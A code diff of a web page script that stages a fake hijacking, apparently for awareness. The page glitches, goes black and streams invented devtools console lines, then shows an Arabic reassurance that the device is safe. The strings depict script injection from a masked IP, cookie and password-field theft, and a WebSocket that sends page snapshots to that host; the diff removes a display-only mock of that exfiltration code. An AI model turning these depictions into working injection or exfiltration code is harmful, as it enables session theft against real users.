@@ -15,6 +15,7 @@
   function theme(c) {
     if (themeMeta) themeMeta.setAttribute("content", c);
     document.documentElement.style.backgroundColor = c;
+    body.style.backgroundColor = c; // browsers that tint their UI from the page pick this up
   }
 
   /* ---------- immersive: real fullscreen only where the browser allows it ----------
@@ -149,6 +150,11 @@
     frozen = true; on("frozen"); sCut(); // sound drops out with the picture
     at(ms, function () { frozen = false; off("frozen"); if (snd.ctx) snd.out.gain.value = 0.55; });
   }
+  function hang(ms) {
+    frozen = true; on("frozen"); on("hang"); sCut();
+    if (insp) insp.remove();
+    at(ms, function () { frozen = false; off("frozen"); off("hang"); });
+  }
   // precise tearing: a few designed horizontal bands of the live page, displaced
   var tearBox = $("#tear");
   function tear(bands, ms) {
@@ -174,45 +180,23 @@
 
   /* ---------- console: suspicious activity inside this web page ---------- */
   var logEl = $("#log"), here = location.origin + location.pathname;
-  var EARLY = [
+  var FAST = [ // short lines, readable at speed
     ["i", "Navigated to " + here, ""],
-    ["v", "[Violation] 'setTimeout' handler took 214ms", "(index):88"],
-    ["w", "Unexpected redirect: /p/qr → /r/7f3a2c (302)", "VM412:3"],
-    ["i", "<script async src=\"//185.62.x.x/l.js\"> inserted into <head>", "VM412:7"],
-    ["w", "document.cookie read by injected script", "l.js:1"],
-    ["e", "Uncaught DOMException: Blocked a frame with origin \"null\" from accessing a cross-origin frame.", "l.js:1"],
-    ["i", "MutationObserver: 3 nodes removed from #intro", "l.js:2"],
-    ["w", "navigator.clipboard.readText() requested", "l.js:2"]
-  ];
-  var LATE = [ // act 1: the script settles in
-    ["i", "Service worker registered — scope: /", "sw-x.js:14"],
-    ["w", "Form field probed: input[type=password]", "l.js:3"],
-    ["e", "Uncaught (in promise) TypeError: Failed to fetch", "l.js:3"],
-    ["i", "postMessage → window.top  targetOrigin: *", "l.js:4"],
-    ["w", "localStorage: keys enumerated", "l.js:4"],
-    ["i", "h1.intro-title textContent rewritten", "l.js:6"],
-    ["v", "[Violation] Forced reflow while executing JavaScript took 96ms", "l.js:5"],
-    ["w", "history.pushState() overridden", "l.js:6"]
-  ];
-  var LATE2 = [ // act 2: it talks to the outside
-    ["i", "WebSocket open: wss://185.62.x.x:8443/s", "l.js:5"],
-    ["i", "fetch POST /c  (keepalive beacon)", "l.js:7"],
-    ["e", "Refused to execute inline script — retrying via eval()", "l.js:7"],
-    ["w", "Event listeners attached to document (×42)", "l.js:8"],
-    ["i", "MutationObserver: #intro subtree observed", "l.js:8"],
-    ["e", "WebSocket connection to 'wss://185.62.x.x:8443/' failed — reconnecting", "l.js:8"],
-    ["i", "WebSocket open: wss://185.62.x.x:8443/s (2)", "l.js:8"],
-    ["w", "setInterval(snapshot, 40) registered", "l.js:9"]
-  ];
-  var LATE3 = [ // act 3: it takes over the page
-    ["i", "document.body subtree replaced", "l.js:9"],
+    ["w", "Unexpected redirect → /r/7f3a2c", "VM412:3"],
+    ["i", "<script src=\"//185.62.x.x/l.js\"> injected", "VM412:7"],
+    ["w", "document.cookie read", "l.js:1"],
+    ["e", "Blocked a cross-origin frame", "l.js:1"],
+    ["w", "clipboard.readText() requested", "l.js:2"],
+    ["i", "Service worker registered", "sw-x.js:14"],
+    ["w", "input[type=password] probed", "l.js:3"],
+    ["i", "WebSocket open  wss://185.62.x.x", "l.js:5"],
+    ["e", "Failed to fetch", "l.js:3"],
+    ["w", "history.pushState() overridden", "l.js:6"],
+    ["i", "h1 textContent rewritten", "l.js:6"],
+    ["i", "POST /c  keepalive beacon", "l.js:7"],
     ["w", "Second session attached to this page", "l.js:10"],
-    ["e", "Uncaught RangeError: Maximum call stack size exceeded", "l.js:9"],
-    ["i", "snapshot → wss://185.62.x.x:8443/s  (frame 211)", "l.js:9"],
-    ["w", "This page is now controlled by a script it did not load", "l.js:9"],
-    ["e", "Uncaught Error: original document detached", "l.js:11"],
-    ["i", "snapshot → wss://185.62.x.x:8443/s  (frame 212)", "l.js:9"],
-    ["w", "Input events forwarded to remote session", "l.js:12"]
+    ["e", "Maximum call stack size exceeded", "l.js:9"],
+    ["w", "Page controlled by a script it did not load", "l.js:9"]
   ];
   function addRow(r) {
     var d = document.createElement("div");
@@ -265,43 +249,6 @@
     })();
   }
 
-  /* ---------- Sources view: the injected script "running" (display only, never executed) ---------- */
-  var SRC = [
-    '<span class=c>// l.js — injected via redirect</span>',
-    '<span class=k>const</span> s = <span class=k>new</span> WebSocket(<span class=q>"wss://185.62.x.x:8443/s"</span>);',
-    'document.querySelectorAll(<span class=q>"input"</span>).forEach(probe);',
-    'history.pushState(<span class=k>null</span>, <span class=q>""</span>, location.href);',
-    'navigator.serviceWorker.register(<span class=q>"/sw-x.js"</span>);',
-    '<span class=k>new</span> MutationObserver(mirror).observe(document.body, {subtree:<span class=k>true</span>});',
-    'setInterval(() =&gt; s.send(snapshot(document)), <span class=q>40</span>);',
-    's.onmessage = (m) =&gt; apply(JSON.parse(m.data));',
-    'document.querySelector(<span class=q>"h1"</span>).textContent = m.title;',
-    'replaceBody(m.html);',
-    '<span class=k>debugger</span>;'
-  ];
-  var srcEl = $("#src"), srcTimer;
-  function showSources() {
-    srcEl.innerHTML = SRC.map(function (l) { return "<div>" + l + "</div>"; }).join("");
-    var tabs = document.querySelectorAll(".dt-head span");
-    tabs[1].classList.remove("on"); tabs[2].classList.add("on"); on("srcview");
-    var lines = srcEl.children, i = 0;
-    srcTimer = setInterval(function () {
-      if (frozen) return;
-      Array.prototype.forEach.call(lines, function (l) { l.classList.remove("x"); });
-      lines[Math.min(i++, lines.length - 1)].classList.add("x"); sTick(1800);
-    }, calm ? 260 : 150);
-  }
-  function showConsole() {
-    clearInterval(srcTimer);
-    var tabs = document.querySelectorAll(".dt-head span");
-    tabs[2].classList.remove("on"); tabs[1].classList.add("on"); off("srcview");
-  }
-  // "Paused in debugger": everything on the page stops dead for a moment
-  function debuggerPause(ms) {
-    frozen = true; on("frozen"); on("paused"); sCut();
-    at(ms, function () { frozen = false; off("frozen"); off("paused"); if (snd.ctx) snd.out.gain.value = 0.55; });
-  }
-
   /* ---------- inspector highlight on the page title ---------- */
   var insp;
   function inspect(el) {
@@ -315,8 +262,7 @@
   function endMiddle() {
     logOn = false; netOn = false; frozen = false;
     tearBox.innerHTML = ""; bf.classList.remove("on");
-    clearInterval(srcTimer);
-    ["stall", "dt-on", "taken", "net-on", "lb", "frozen", "paused", "srcview", "dim1", "dim2", "dim3", "dim4"].forEach(off);
+    ["stall", "dt-on", "taken", "net-on", "lb", "frozen", "hang", "dim1", "dim2", "dim3", "dim4"].forEach(off);
     $("#skip").hidden = true;
     sCut();
   }
@@ -327,79 +273,53 @@
     phase("safe"); theme("#050607");
     at(150, function () { $(".safe-1").classList.add("in"); });
     at(900, function () { $(".safe-2").classList.add("in"); });
+    at(1900, function () { $(".safe-club").classList.add("in"); });
     at(4500, function () { var r = $("#replay"); r.hidden = false; requestAnimationFrame(function () { r.classList.add("in"); }); });
   }
 
   /* ---------- master timeline (ms) ----------
-     0.0–2.6   participation page, untouched (2 s longer than before)
-     2.6–3.0   uneasy calm: loader stalls, a twitch, one dropped frame
-     3.0–5.0   the page sheds elements, devtools open on their own, brown-out to black
-     5.0–12.5  black escalation in three acts (rewrite · outside contact · takeover)
-     12.5–13.1 hard cut: black, still, silent
-     13.1→     "لا تخاف، جهازك آمن" — stays until the visitor leaves or replays */
-  var D = 2000; // extra time on the opening page
+     0.0–2.0  participation page, untouched
+     2.0–5.0  attack: the page breaks, goes black, devtools stream suspicious activity
+     5.0–5.5  FREEZE: the picture stops dead (visual only)
+     5.5–7.5  pure black — no text, no motion
+     7.5→     "لا تخاف، جهازك آمن" — stays until the visitor leaves or replays */
   function run() {
     var badge = $(".intro-badge"), sub = $(".intro-sub"), loader = $(".intro-loader");
     var line1 = cfg.hijackLine1 || "هذه الصفحة لم تعد كما فتحتها",
-        line2 = cfg.hijackLine2 || "من يتحكم بها الآن؟",
-        line3 = cfg.hijackLine3 || "شخص آخر يشاهد هذه الصفحة الآن";
+        line2 = cfg.hijackLine2 || "من يتحكم بها الآن؟";
+    on("run");
     soundInit();
-    function t(ms, fn) { at(D + ms, fn); }
 
-    // uneasy calm
-    t(600, function () { on("stall"); });
-    t(790, function () { if (!calm) pulse(function () { badge.style.transform = "translateX(3px)"; }, function () { badge.style.transform = ""; }, 70); sTick(5200); });
-    t(960, function () { blackFrame(45); sBurst(0.05, 3000, 0.15); });
+    // 2.0–5.0 — attack
+    at(2000, function () { on("stall"); blackFrame(40); vanish(sub); glitchTitle(null, 90); sBurst(0.05, 3000, 0.15); $("#skip").hidden = false; });
+    at(2100, function () { on("dt-on"); streamLog(FAST, 210, 120, 2700); });
+    at(2250, function () { vanish(loader); });
+    at(2350, function () { on("dim1"); theme("#d9dbdf"); });
+    at(2450, function () { vanish(badge); on("dim2"); theme("#7d8087"); });
+    at(2520, function () { off("dim2"); });
+    at(2570, function () { on("dim2"); sBurst(0.08, 400, 0.2); });
+    at(2700, function () { on("dim3"); theme("#17181b"); tear(TEAR_A, 80); sHum(); });
+    at(2850, function () { on("dim4"); on("taken"); theme("#000000"); });
+    at(3050, function () { inspect(title); });
+    at(3330, function () { if (insp) insp.remove(); rewriteTitle(line1); });
+    at(3550, function () { freeze(120); });
+    at(3670, function () { blackFrame(30); });
+    at(3750, function () { on("net-on"); streamNet(); });
+    at(3950, function () { tear(TEAR_B, 90); });
+    at(4150, function () { rewriteTitle(line2); });
+    at(4350, function () { on("lb"); });
+    at(4450, function () { freeze(90); });
+    at(4650, function () { glitchTitle("g2", 120); tear(TEAR_C, 60); });
+    at(4850, function () { tear(TEAR_D, 50); });
 
-    // the page starts coming apart
-    t(1060, function () { vanish(sub); glitchTitle(null, 90); $("#skip").hidden = false; });
-    t(1260, function () { on("dt-on"); streamLog(EARLY, 260, 230, 1700); });
-    t(1520, function () { vanish(loader); });
-    t(1680, function () { glitchTitle(null, 110); });
-    t(1860, function () { on("dim1"); theme("#d9dbdf"); sTick(700); });
-    t(2060, function () { vanish(badge); });
-    t(2160, function () { on("dim2"); theme("#7d8087"); });
-    t(2230, function () { off("dim2"); });
-    t(2290, function () { on("dim2"); sBurst(0.08, 400, 0.2); });
-    t(2450, function () { tear(TEAR_A, 90); });
-    t(2620, function () { on("dim3"); theme("#17181b"); sHum(); });
-    t(2820, function () { glitchTitle("g2", 120); });
+    // 5.0–5.5 — the freeze
+    at(5000, function () { hang(500); });
 
-    // act 1 — black; the script rewrites the page
-    t(3000, function () { on("dim4"); on("taken"); theme("#0b0b0c"); logOn = false; streamLog(LATE, 240, 140, 2400); });
-    t(3500, function () { inspect(title); });
-    t(3900, function () { if (insp) insp.remove(); rewriteTitle(line1); });
-    t(4150, function () { freeze(140); });
-    t(4290, function () { blackFrame(40); });
+    // 5.5–7.5 — black, still, silent
+    at(5500, function () { endMiddle(); phase("void"); theme("#000000"); });
 
-    // act 2 — it talks to the outside
-    t(4600, function () { on("net-on"); streamNet(); sBurst(0.06, 2000, 0.15); logOn = false; streamLog(LATE2, 150, 90, 2200); });
-    t(5000, function () { on("lb"); });
-    t(5350, function () { tear(TEAR_B, 110); });
-    t(5800, function () { glitchTitle("g2", 140); });
-    t(6100, function () { inspect(title); });
-    t(6350, function () { if (insp) insp.remove(); rewriteTitle(line2); });
-    t(6650, function () { freeze(90); });
-    t(6740, function () { blackFrame(30); });
-    t(6950, function () { showSources(); });
-
-    // act 3 — the debugger stops the world, then it takes over
-    t(7700, function () { debuggerPause(calm ? 900 : 750); });
-    t(8460, function () { showConsole(); logOn = false; streamLog(LATE3, 90, 32, 2000); tear(TEAR_C, 70); });
-    t(8700, function () { rewriteTitle(line3); });
-    t(9100, function () { tear(TEAR_B, 90); });
-    t(9400, function () { glitchTitle("g2", 160); });
-    t(9650, function () { freeze(80); });
-    t(9730, function () { blackFrame(30); });
-    t(9900, function () { tear(TEAR_D, 60); });
-    t(10050, function () { tear(TEAR_C, 60); });
-    t(10200, function () { glitchTitle("g2", 200); });
-    t(10330, function () { blackFrame(30); });
-    t(10420, function () { tear(TEAR_C, 60); });
-
-    // hard cut: everything disappears at once — black, still, silent
-    t(10500, function () { endMiddle(); phase("void"); theme("#000000"); });
-    t(11100, relief);
+    // 7.5 — reassurance
+    at(7500, relief);
   }
 
   $("#skip").addEventListener("click", function () { clearAll(); relief(); });
